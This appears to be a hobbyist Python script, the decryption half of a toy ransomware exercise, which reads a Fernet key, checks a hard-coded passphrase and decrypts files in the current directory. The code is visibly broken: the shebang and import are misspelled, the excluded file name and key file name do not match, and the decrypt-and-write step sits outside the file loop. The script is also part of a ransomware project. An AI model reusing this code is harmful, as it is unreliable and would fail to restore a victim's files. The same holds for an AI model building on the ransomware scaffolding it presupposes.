#decryping the ransomware

# nano decrypt.py
#!/usr/bin/env pyhton3

import os
from crypyography.fernet import Fernet

#let's find some files

files = []

for file in os.listdir():
	if file == "ransomware.py" or file == "thekey.key" or file == "decrypet.py":
		continue
	if os.path.isfile(file):
		files.append(file)

print(files)

with open("thekey" , "rb") as key:
	secretkey = key.read()

secretphrase = "milk"

user_phrase = input("ENter the phrase to decrypt your files\n")

if user_phrase == secretphrase:
	for file in files:
		with open(file, "rb") as thefile:
			contents = thefile.read()
	contents_decrypted = Fernet(secretkey).decrypt(contents)
	with open(file, "wb") as thefile:
		thefile .write(contents_decrypted)
		print("Your file are decrypted")
else: print("Wrong password")
